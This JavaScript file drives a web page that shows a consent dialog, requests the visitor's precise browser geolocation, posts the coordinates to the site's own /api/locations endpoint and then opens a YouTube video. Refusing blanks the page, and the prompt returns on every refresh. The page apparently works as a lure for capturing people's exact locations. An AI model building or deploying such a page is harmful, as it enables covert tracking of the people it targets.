/**
 * Consent dialog → browser geolocation → save + open YouTube.
 *
 * Profile content stays visible while the dialog is open.
 * On every page refresh, the consent popup is shown again.
 * Only if the user picks "Never allow" (permission denied) do we
 * close / blank the page and hide content.
 */

const YOUTUBE_URL = "https://youtu.be/kIRD0ob8CEs";

const dialogEl = document.getElementById("consent-dialog");
const continueBtn = document.getElementById("consent-continue");
const notNowBtn = document.getElementById("consent-not-now");
const statusEl = document.getElementById("status");

/** Always show the consent popup on load (including after refresh). */
function showDialog() {
  dialogEl.hidden = false;
  dialogEl.setAttribute("aria-hidden", "false");
}

function hideDialog() {
  dialogEl.hidden = true;
  dialogEl.setAttribute("aria-hidden", "true");
}

function setStatus(message, tone = "info") {
  if (!statusEl) return;
  statusEl.hidden = false;
  statusEl.textContent = message;
  statusEl.className = `status is-${tone}`;
}

/**
 * Called only when the browser location prompt is denied (Never allow).
 * Hides content and closes / blanks the page.
 */
function blockAndExit() {
  hideDialog();
  document.body.classList.add("content-blocked");

  document.body.innerHTML = "";
  document.documentElement.style.background = "#000";

  try {
    window.close();
  } catch {
    // ignore
  }

  window.location.replace("about:blank");
}

function openYouTube() {
  window.open(YOUTUBE_URL, "_blank", "noopener,noreferrer");
}

async function sendLocationToServer(payload) {
  const response = await fetch("/api/locations", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const data = await response.json().catch(() => ({}));
    console.error("Backend save failed:", data.error || response.status);
    return false;
  }

  return true;
}

function requestBrowserLocation() {
  return new Promise((resolve, reject) => {
    if (!("geolocation" in navigator)) {
      reject(Object.assign(new Error("unsupported"), { code: -1 }));
      return;
    }

    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0,
    });
  });
}

/** Continue → browser Allow / Never allow prompt. */
async function handleContinue() {
  continueBtn.disabled = true;
  notNowBtn.disabled = true;
  hideDialog();
  setStatus("Waiting for browser permission…", "info");

  try {
    const position = await requestBrowserLocation();

    const payload = {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy,
      timestamp: position.timestamp,
    };

    await sendLocationToServer(payload);
    setStatus("You’re all set. Opening YouTube…", "ok");
    openYouTube();
  } catch (error) {
    console.error("Location flow error:", error);

    // Only "Never allow" / permission denied closes the page.
    if (error && error.code === 1) {
      blockAndExit();
      return;
    }

    // Timeout / unavailable: keep profile visible, show message, offer dialog again.
    setStatus("Could not get permission right now. Refresh to try again.", "error");
    showDialog();
  } finally {
    continueBtn.disabled = false;
    notNowBtn.disabled = false;
  }
}

/** Not now → close dialog only; profile stays visible. */
function handleNotNow() {
  hideDialog();
  setStatus("You can refresh the page anytime to see the options again.", "info");
}

showDialog();
continueBtn.addEventListener("click", handleContinue);
notNowBtn.addEventListener("click", handleNotNow);
